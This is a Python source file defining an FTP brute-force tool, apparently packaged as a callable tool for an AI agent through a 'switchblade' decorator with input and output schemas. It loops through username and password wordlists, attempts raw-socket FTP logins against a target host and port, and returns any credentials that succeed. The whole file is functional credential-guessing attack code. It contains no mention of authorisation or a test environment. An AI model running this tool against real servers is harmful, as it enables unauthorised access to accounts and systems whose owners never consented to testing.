import socket
import time
from src.utils.switchblade_decorator import tool

@tool(
    name="brute_force_service",
    description="Systematically tries credential combinations from wordlists for FTP or other services.",
    input_schema={
        "type": "object",
        "properties": {
            "target_ip": {"type": "string", "description": "Target IPv4 or hostname"},
            "port": {"type": "integer", "description": "Port number (e.g., 21)"},
            "protocol": {"type": "string", "description": "Protocol type (only 'ftp' supported for raw socket brute force)"},
            "username_list_path": {"type": "string", "description": "Path to the username wordlist file"},
            "password_list_path": {"type": "string", "description": "Path to the password wordlist file"},
            "delay": {"type": "number", "description": "Delay between attempts in seconds (default 0.1)"}
        },
        "required": ["target_ip", "port", "protocol", "username_list_path", "password_list_path"],
    },
    output_schema={
        "type": "object",
        "properties": {
            "status": {"type": "string", "description": "success, not_successful, or error"},
            "response": {"type": "string", "description": "Credential string if found"},
            "detection_flag": {"type": "boolean", "description": "True if valid credentials were found"},
            "attempts_made": {"type": "integer", "description": "Total combinations tried"}
        },
    },
)
def brute_force_service(args):
    host = args.get("target_ip")
    port = args.get("port")
    protocol = args.get("protocol").lower()
    user_path = args.get("username_list_path")
    pass_path = args.get("password_list_path")
    delay = args.get("delay", 0.1)

    attempts = 0

    try:
        with open(user_path, "r") as u_file, open(pass_path, "r") as p_file:
            usernames = [u.strip() for u in u_file.readlines()]
            passwords = [p.strip() for p in p_file.readlines()]

        for user in usernames:
            for pwd in passwords:
                attempts += 1
                
                # Internal logic based on protocol
                if protocol == "ftp":
                    if _try_ftp_login_raw(host, port, user, pwd):
                        return {
                            "status": "success",
                            "response": f"Valid Credentials Found: {user}:{pwd}",
                            "detection_flag": True,
                            "attempts_made": attempts
                        }
                
                if delay > 0:
                    time.sleep(delay)

        return {
            "status": "not_successful",
            "response": "Exhausted wordlist. No valid credentials found.",
            "detection_flag": False,
            "attempts_made": attempts
        }

    except FileNotFoundError as e:
        return {"status": "error", "response": f"Wordlist not found: {str(e)}", "detection_flag": False}
    except Exception as e:
        return {"status": "error", "response": f"Unexpected error: {str(e)}", "detection_flag": False}

def _try_ftp_login_raw(host, port, username, password):
    """Native socket implementation of an FTP login attempt (No ftplib)."""
    try:
        with socket.create_connection((host, port), timeout=5) as sock:
            # Initial Banner
            sock.recv(1024)
            
            # Send User
            sock.sendall(f"USER {username}\r\n".encode())
            sock.recv(1024)
            
            # Send Pass
            sock.sendall(f"PASS {password}\r\n".encode())
            resp = sock.recv(1024).decode()
            
            # FTP Success Code is 230
            return "230" in resp
    except:
        return False